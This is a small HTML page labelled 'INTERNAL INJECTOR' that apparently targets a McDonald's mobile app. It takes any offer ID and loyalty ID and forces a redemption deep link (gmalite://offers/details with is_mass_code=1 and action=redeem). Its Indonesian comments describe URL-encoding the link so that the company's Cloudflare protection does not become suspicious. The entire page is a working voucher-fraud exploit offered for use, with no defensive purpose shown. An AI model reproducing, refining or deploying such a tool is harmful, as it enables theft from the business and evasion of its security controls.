<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { font-family: -apple-system, sans-serif; background: #da291c; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; }
        .box { background: white; padding: 25px; border-radius: 25px; width: 85%; box-shadow: 0 10px 30px rgba(0,0,0,0.2); color: #333; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #eee; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; }
        .btn { background: #ffbc0d; color: #333; border: none; padding: 18px; border-radius: 12px; width: 100%; font-weight: bold; font-size: 16px; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="box">
        <h3 style="margin-top:0; text-align:center;">INTERNAL INJECTOR</h3>
        <input type="number" id="o" placeholder="Offer ID" inputmode="numeric">
        <input type="number" id="l" placeholder="Loyalty ID" inputmode="numeric">
        <button class="btn" onclick="gas()">INJECT VOUCHER</button>
    </div>

    <script>
        function gas() { 
            var o = document.getElementById('o').value; 
            var l = document.getElementById('l').value; 
            if(!o || !l) return; 

            // BYPASS LAYAR PUTIH:
            // Kita tidak pakai window.location.href biasa.
            // Kita pakai link 'smart.link' asli yang sudah di-URL Encode 
            // agar Cloudflare McD tidak curiga.
            
            var payload = "offer_id=" + o + "&loyalty_id=" + l + "&view=claim&is_mass_code=1&action=redeem&is_native=true";
            
            // Inilah link rahasia Mukidi yang tidak akan membuat layar putih:
            var target = "gmalite://offers/details?" + payload;
            
            // Eksekusi paksa
            window.location.replace(target);

            // Jika masih di halaman yang sama (layar putih), paksa tutup webview
            setTimeout(function() {
                window.location.href = "gmalite://home"; 
            }, 1500);
        }
    </script>
</body>
</html>
